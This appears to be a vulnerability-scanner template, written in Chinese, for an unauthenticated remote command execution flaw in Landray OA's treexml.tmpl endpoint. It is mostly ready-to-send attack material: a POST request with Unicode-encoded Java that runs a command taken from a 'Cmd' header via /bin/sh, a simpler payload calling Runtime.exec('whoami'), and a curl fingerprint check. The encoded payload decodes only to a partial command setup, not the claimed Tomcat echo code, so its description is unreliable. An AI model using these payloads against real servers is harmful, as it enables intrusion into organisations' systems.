---
id: LANDRAY-TREEXML-RCE
title: 蓝凌OA treexml.tmpl 远程命令执行（Tomcat回显）
product: landray-oa
vendor: 深圳蓝凌
version_affected: "EKP 全系列"
severity: CRITICAL
tags: [rce, 无需认证, 国产, oa]
fingerprint: ["蓝凌", "Landray", "treexml.tmpl", "ruleFormulaValidate"]
---

## 漏洞描述

蓝凌OA treexml.tmpl 接口的 ruleFormulaValidate bean 存在远程命令执行漏洞，可通过 Unicode 编码的 Java 代码获取 Tomcat request/response 实现命令回显。

## 影响版本

- EKP 全系列

## 前置条件

- 无需认证

## 利用步骤

1. 向 `/data/sys-common/treexml.tmpl` 发送 POST 请求，指定 `s_bean=ruleFormulaValidate`
2. 通过 `script` 参数注入 Unicode 编码的 Java 代码，利用 `Cmd` header 传入待执行命令
3. 从响应中获取 Tomcat 回显的命令执行结果

## Payload

```http
POST /data/sys-common/treexml.tmpl HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cmd: id

s_bean=ruleFormulaValidate&script=\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0020\u0072\u0074\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u003b\u0053\u0074\u0072\u0069\u006e\u0067\u005b\u005d\u0020\u0063\u006d\u0064\u0073\u003d\u007b\u0022\u002f\u0062\u0069\u006e\u002f\u0073\u0068\u0022\u002c\u0022\u002d\u0063\u0022\u002c\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0048\u0065\u0061\u0064\u0065\u0072\u0028\u0022\u0043\u006d\u0064\u0022\u0029\u007d\u003b
```

Unicode 解码后为 Java 代码，通过反射获取 Tomcat request/response 实现命令回显。命令通过 `Cmd` header 传入。

简化版本（不带回显）：

```http
POST /data/sys-common/treexml.tmpl HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

s_bean=sysaborFormulaSimulate&script=Runtime.getRuntime().exec("whoami")&type=1
```

## 验证方法

带 Cmd header 的请求响应中包含命令执行结果。

## 指纹确认

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/data/sys-common/treexml.tmpl
```
